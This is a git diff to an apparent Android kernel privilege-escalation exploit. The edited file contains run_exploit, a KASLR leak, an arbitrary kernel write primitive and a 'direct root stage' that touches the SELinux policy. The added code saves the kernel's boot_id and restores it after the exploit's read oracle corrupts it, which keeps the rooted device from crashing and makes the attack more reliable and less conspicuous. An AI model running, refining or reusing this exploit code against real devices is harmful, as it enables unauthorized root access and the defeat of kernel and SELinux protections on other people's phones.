@@ -1,0 +1,83 @@
+diff --git a/payload/src/main.c b/payload/src/main.c
+index 93e75cf..0724094 100644
+--- a/payload/src/main.c
++++ b/payload/src/main.c
+@@ -352,6 +352,59 @@ static int direct_read_enforcing(void) {
+   return -1;
+ }
+ 
++
++/*
++ * random_boot_id_data doubles as the read-back oracle: every direct read
++ * leaves a leaked qword and a self pointer in it, destroying the boot UUID.
++ * libcutils derives the per-boot ashmem device path from that UUID, so a
++ * destroyed UUID makes new app processes open a nonexistent device and die in
++ * bindApplication. Keep the original 16 bytes and put them back once the
++ * oracle is no longer needed.
++ */
++static unsigned char direct_boot_id_backup[16];
++static int direct_boot_id_backup_valid;
++
++static void direct_log_boot_id(const char *phase) {
++  char text[64] = {0};
++  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
++  if (fd >= 0) {
++    ssize_t n = read(fd, text, sizeof(text) - 1);
++    if (n > 0) {
++      text[n] = 0;
++    }
++    close(fd);
++  }
++  pr_success("direct boot_id[%s]=%s", phase, text);
++}
++
++static void direct_backup_boot_id(void) {
++  direct_boot_id_backup_valid =
++      direct_read_boot_id_raw(direct_boot_id_backup);
++  pr_info("direct boot_id backup valid=%d\n", direct_boot_id_backup_valid);
++  direct_log_boot_id("backup");
++}
++
++static void direct_restore_boot_id(int *write_idx) {
++  if (!direct_boot_id_backup_valid) {
++    pr_warning("direct boot_id restore skipped: no backup\n");
++    return;
++  }
++  const uintptr_t b = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
++  uint64_t w0 = 0;
++  uint64_t w1 = 0;
++  memcpy(&w0, direct_boot_id_backup, sizeof(w0));
++  memcpy(&w1, direct_boot_id_backup + 8, sizeof(w1));
++  if (!direct_trigger_write64("restore_boot_id_lo", b, w0, 1, write_idx)) {
++    pr_warning("direct boot_id restore failed word=0\n");
++    return;
++  }
++  if (!direct_trigger_write64("restore_boot_id_hi", b + 8, w1, 1, write_idx)) {
++    pr_warning("direct boot_id restore failed word=1\n");
++    return;
++  }
++  direct_log_boot_id("restored");
++}
++
+ static int direct_reload_selinux_policy(size_t *policy_size) {
+   int policy_fd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
+   if (policy_fd < 0) {
+@@ -557,6 +610,10 @@ static int run_direct_root_stage(void) {
+     return 0;
+   }
+ 
++  /* All oracle reads are done; give the kernel its boot UUID back so that
++   * processes created after the run can still find their ashmem device. */
++  direct_restore_boot_id(&write_idx);
++
+   if (!restore_initial_affinity()) {
+     pr_error("restore initial CPU affinity failed errno=%d\n", errno);
+     return 0;
+@@ -607,6 +664,7 @@ int run_exploit(int argc, char **argv) {
+   log_startup_context();
+ 
+   pin_to_core(CORE);
++  direct_backup_boot_id();
+   if (!slide_leak_kernel_base()) {
+     pr_error("slide kaslr leak failed\n");
+     return 1;
